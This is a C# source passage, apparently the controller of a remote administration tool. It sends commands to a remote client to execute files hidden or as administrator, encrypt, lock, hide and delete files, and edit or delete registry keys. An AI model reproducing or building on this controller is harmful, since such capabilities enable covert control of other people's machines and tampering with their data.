    private void HidenToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "Hiddenexecute";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RunAsAdministratorToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "RunasAdministartor";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void AddArchiveToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            string text = Interaction.InputBox("Name", "Add Archive", Path.GetFileName(TextBox1.Text) + ".rar");
            if (string.IsNullOrEmpty(text))
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
                {
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "AddArchive";
                    msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    msgPack.ForcePathObject("Path").AsString = TextBox1.Text + "\\";
                    msgPack.ForcePathObject("NamaRAR").AsString = text;
                    msgPack.ForcePathObject("FileNama").AsString = AreListview2.SelectedItems[0].Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
                else if (selectedItem.ImageIndex == 0)
                {
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "AddArchive";
                    msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    msgPack.ForcePathObject("Path").AsString = TextBox1.Text + "\\";
                    msgPack.ForcePathObject("NamaRAR").AsString = text;
                    msgPack.ForcePathObject("FileNama").AsString = AreListview2.SelectedItems[0].Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void ExtractHereToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "ExtractArchive";
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                msgPack.ForcePathObject("NamaRAR").AsString = Path.GetFileName(selectedItem.ToolTipText);
                msgPack.ForcePathObject("Save").AsString = "UnRAR_" + Path.GetFileName(TextBox1.Text) + "\\";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "encryptFile";
                    msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "dcryptFile";
                    msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void LockToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "Lock";
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void UnlockToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "Unlock";
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (AreListview2.SelectedItems.Count == 1)
        {
            return;
        }
        try
        {
            string text = Interaction.InputBox("Rename File or Folder", "Name", AreListview2.SelectedItems[0].Text);
            if (!string.IsNullOrEmpty(text))
            {
                if (AreListview2.SelectedItems[0].ImageIndex != 0 && AreListview2.SelectedItems[0].ImageIndex != 1 && AreListview2.SelectedItems[0].ImageIndex != 2)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "renameFile";
                    msgPack.ForcePathObject("File").AsString = AreListview2.SelectedItems[0].ToolTipText;
                    msgPack.ForcePathObject("NewName").AsString = Path.Combine(TextBox1.Text, text);
                    msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
                else if (AreListview2.SelectedItems[0].ImageIndex == 0)
                {
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack2.ForcePathObject("Command").AsString = "renameFolder";
                    msgPack2.ForcePathObject("Folder").AsString = AreListview2.SelectedItems[0].ToolTipText + "\\";
                    msgPack2.ForcePathObject("NewName").AsString = Path.Combine(TextBox1.Text, text);
                    msgPack2.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void EditorToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem itm in AreListview2.SelectedItems)
            {
                if (itm.ImageIndex == 0 || itm.ImageIndex == 1 || itm.ImageIndex == 2)
                {
                    continue;
                }
                string dwid = Guid.NewGuid().ToString();
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "Editor";
                msgPack.ForcePathObject("File").AsString = itm.ToolTipText;
                msgPack.ForcePathObject("DWID").AsString = dwid;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                BeginInvoke((MethodInvoker)delegate
                {
                    FormNote formNote = (FormNote)Application.OpenForms["Editor:" + dwid];
                    if (formNote == null)
                    {
                        formNote = new FormNote
                        {
                            Name = "Editor:" + dwid,
                            Text = "Editor",
                            Info = UserIdInfo.Text,
                            PathsFile = itm.ToolTipText,
                            SizeFile = itm.SubItems[3].Text,
                            TypeFile = itm.SubItems[2].Text,
                            DateFile = itm.SubItems[1].Text,
                            Client = Client
                        };
                        formNote.Show();
                    }
                });
            }
        }
        catch
        {
        }
    }

    private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            StringBuilder stringBuilder = new StringBuilder();
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                stringBuilder.Append(selectedItem.ToolTipText + "-=>");
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "copyFile";
            msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
            msgPack.ForcePathObject("IO").AsString = "copy";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void CutToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            StringBuilder stringBuilder = new StringBuilder();
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                stringBuilder.Append(selectedItem.ToolTipText + "-=>");
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "copyFile";
            msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
            msgPack.ForcePathObject("IO").AsString = "cut";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "pasteFile";
            msgPack.ForcePathObject("File").AsString = TextBox1.Text;
            msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void FolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text = Interaction.InputBox("Name", "Create Folder", "New folder");
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "createFolder";
                msgPack.ForcePathObject("Folder").AsString = Path.Combine(TextBox1.Text, text);
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void EmptyFileToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text = Interaction.InputBox("Name", "Create File", "New Text Document.txt");
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "createFile";
                msgPack.ForcePathObject("File").AsString = Path.Combine(TextBox1.Text, text);
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void HideToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "HiddenAndShow";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "HiddenAndShow";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "deleteFile";
                    msgPack.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
                else if (selectedItem.ImageIndex == 0)
                {
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
                    msgPack2.ForcePathObject("Refresh").AsString = TextBox1.Text;
                    msgPack2.ForcePathObject("Folder").AsString = selectedItem.ToolTipText;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch
        {
        }
    }

    private void OpenDownloadFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(DownloadPath))
            {
                Directory.CreateDirectory(DownloadPath);
                FullPath = DownloadPath;
            }
            else
            {
                FullPath = DownloadPath;
            }
            Process.Start(FullPath);
        }
        catch
        {
        }
    }

    private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
    {
        switch (valueKind)
        {
            case RegistryValueKind.String:
            case RegistryValueKind.ExpandString:
                return new FormRegValueEditString(value);
            case RegistryValueKind.Binary:
                return new FormRegValueEditBinary(value);
            case RegistryValueKind.MultiString:
                return new FormRegValueEditMultiString(value);
            default:
                return null;
            case RegistryValueKind.DWord:
            case RegistryValueKind.QWord:
                return new FormRegValueEditWord(value);
        }
    }

    private void CreateEditForm(bool isBinary)
    {
        _ = tvRegistryDirectory.SelectedNode.FullPath;
        string name = lstRegistryValues.SelectedItems[0].Name;
        RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])tvRegistryDirectory.SelectedNode.Tag).ToList().Find((RegistrySeeker.RegValueData item) => item.Name == name);
        RegistryValueKind valueKind = (isBinary ? RegistryValueKind.Binary : regValueData.Kind);
        using Form form = GetEditForm(regValueData, valueKind);
        if (form.ShowDialog() == DialogResult.OK)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void modifyToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        CreateEditForm(isBinary: false);
    }

    private void modifyBinaryDataToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        CreateEditForm(isBinary: true);
    }

    private void createNewRegistryKey_Click(object sender, EventArgs e)
    {
    }

    private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
    {
        if (e.Node == tvRegistryDirectory.SelectedNode)
        {
            createNewRegistryKey_Click(this, e);
            tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
        }
    }

    private void keyToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (!tvRegistryDirectory.SelectedNode.IsExpanded && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
        {
            tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
            tvRegistryDirectory.SelectedNode.Expand();
            return;
        }
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "regManager";
        msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
        msgPack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
    }

    private void stringValueToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "1";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void binaryValueToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "3";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void dWORD32bitValueToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "4";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void qWORD64bitValueToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "11";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void multiStringValueToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "7";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void expandableStringValueToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "2";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void deleteRegistryKey_Click(object sender, EventArgs e)
    {
    }

    private void deleteRegistryValue_Click(object sender, EventArgs e)
    {
    }

    private void deleteToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.Focused)
        {
            deleteRegistryKey_Click(this, e);
        }
        else if (lstRegistryValues.Focused)
        {
            deleteRegistryValue_Click(this, e);
        }
    }

    private void renameRegistryKey_Click(object sender, EventArgs e)
    {
        tvRegistryDirectory.LabelEdit = true;
        tvRegistryDirectory.SelectedNode.BeginEdit();
    }

    private void renameRegistryValue_Click(object sender, EventArgs e)
    {
        lstRegistryValues.LabelEdit = true;
        lstRegistryValues.SelectedItems[0].BeginEdit();
    }

    private void renameToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        if (tvRegistryDirectory.Focused)
        {
            renameRegistryKey_Click(this, e);
        }
        else if (lstRegistryValues.Focused)
        {
            renameRegistryValue_Click(this, e);
        }
    }

    private void CreateTreeViewMenuStrip()
    {
        renameToolStripMenuItem2.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;
        deleteToolStripMenuItem2.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;
    }

    private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
    {
        if (e.Button == MouseButtons.Right)
        {
            tvRegistryDirectory.SelectedNode = e.Node;
            Point position = new Point(e.X, e.Y);
            CreateTreeViewMenuStrip();
            tv_ContextMenuStrip.Show(tvRegistryDirectory, position);
        }
    }

    private bool GetDeleteState()
    {
        if (lstRegistryValues.Focused)
        {
            return lstRegistryValues.SelectedItems.Count > 0;
        }
        if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
        {
            return tvRegistryDirectory.SelectedNode.Parent != null;
        }
        return false;
    }

    private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Delete && GetDeleteState())
        {
            deleteRegistryKey_Click(this, e);
        }
    }

    private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
    {
        lstRegistryValues.BeginUpdate();
        lstRegistryValues.Items.Clear();
        values = values.OrderBy((RegistrySeeker.RegValueData value) => value.Name).ToArray();
        RegistrySeeker.RegValueData[] array = values;
        foreach (RegistrySeeker.RegValueData value2 in array)
        {
            RegistryValueLstItem value3 = new RegistryValueLstItem(value2);
            lstRegistryValues.Items.Add(value3);
        }
        lstRegistryValues.EndUpdate();
    }

    private void UpdateLstRegistryValues(TreeNode node)
    {
        LogsRegistry.Text = node.FullPath;
        RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
        PopulateLstRegistryValues(values);
    }

    private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
    {
        UpdateLstRegistryValues(e.Node);
    }

    private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
    {
        TreeNode node = e.Node;
        if (string.IsNullOrEmpty(node.FirstNode.Name))
        {
            tvRegistryDirectory.SuspendLayout();
            node.Nodes.Clear();
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
            msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            Thread.Sleep(500);
            tvRegistryDirectory.ResumeLayout();
            e.Cancel = true;
        }
    }

    private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
    {
        if (e.Label != null)
        {
            e.CancelEdit = true;
            if (e.Label.Length > 0)
            {
                if (e.Node.Parent.Nodes.ContainsKey(e.Label))
                {
                    MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    e.Node.BeginEdit();
                    return;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
                msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
                msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
                msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                tvRegistryDirectory.LabelEdit = false;
            }
            else
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                e.Node.BeginEdit();
            }
        }
        else
        {
            tvRegistryDirectory.LabelEdit = false;
        }
    }

    private void keyToolStripMenuItem_Click(object sender, EventArgs e)
    {
        keyToolStripMenuItem2_Click(this, e);
    }

    private void stringValueToolStripMenuItem_Click(object sender, EventArgs e)
    {
        stringValueToolStripMenuItem2_Click(this, e);
    }

    private void binaryValueToolStripMenuItem_Click(object sender, EventArgs e)
    {
        binaryValueToolStripMenuItem2_Click(this, e);
    }

    private void dWORD32bitValueToolStripMenuItem_Click(object sender, EventArgs e)
    {
        dWORD32bitValueToolStripMenuItem2_Click(this, e);
    }

    private void qWORD64bitValueToolStripMenuItem_Click(object sender, EventArgs e)
    {
        qWORD64bitValueToolStripMenuItem2_Click(this, e);
    }

    private void multiStringValueToolStripMenuItem_Click(object sender, EventArgs e)
    {
        multiStringValueToolStripMenuItem2_Click(this, e);
    }

    private void expandableStringValueToolStripMenuItem_Click(object sender, EventArgs e)
    {
        expandableStringValueToolStripMenuItem2_Click(this, e);
    }

    private void toolStripMenuItem2_Click(object sender, EventArgs e)
    {
        string text = "Are you sure you want to permanently delete this key and all of its subkeys?";
        string caption = "Confirm Key Delete";
        DialogResult dialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
        if (dialogResult == DialogResult.Yes)
        {
            string fullPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
            msgPack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
            msgPack.ForcePathObject("ParentPath").AsString = fullPath;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void toolStripMenuItem3_Click(object sender, EventArgs e)
    {
        renameToolStripMenuItem2_Click(this, e);
    }

    private void modifyToolStripMenuItem_Click(object sender, EventArgs e)
    {
        CreateEditForm(isBinary: false);
    }

    private void modifyBinaryDataToolStripMenuItem_Click(object sender, EventArgs e)
    {
        CreateEditForm(isBinary: true);
    }

    private void deleteToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        string text = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
        string caption = "Confirm Value Delete";
        DialogResult dialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
        if (dialogResult != DialogResult.Yes)
        {
            return;
        }
        foreach (object selectedItem in lstRegistryValues.SelectedItems)
        {
            if (selectedItem.GetType() == typeof(RegistryValueLstItem))
            {
                RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)selectedItem;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
    }

    private void renameToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        lstRegistryValues.LabelEdit = true;
        lstRegistryValues.SelectedItems[0].BeginEdit();
    }

    private void keyToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        keyToolStripMenuItem2_Click(this, e);
    }

    private void stringValueToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        stringValueToolStripMenuItem2_Click(this, e);
    }

    private void binaryValueToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        binaryValueToolStripMenuItem2_Click(this, e);
    }

    private void dWORD32bitValueToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        dWORD32bitValueToolStripMenuItem2_Click(this, e);
    }

    private void qWORD64bitValueToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        qWORD64bitValueToolStripMenuItem2_Click(this, e);
    }

    private void multiStringValueToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        multiStringValueToolStripMenuItem2_Click(this, e);
    }

    private void expandableStringValueToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        expandableStringValueToolStripMenuItem2_Click(this, e);
    }

    private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
    {
        TreeNode treeNode = CreateNode(match.Key, match.Key, match.Data);
        treeNode.Nodes.Add(new TreeNode());
        tvRegistryDirectory.Nodes.Add(treeNode);
    }

    private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
    {
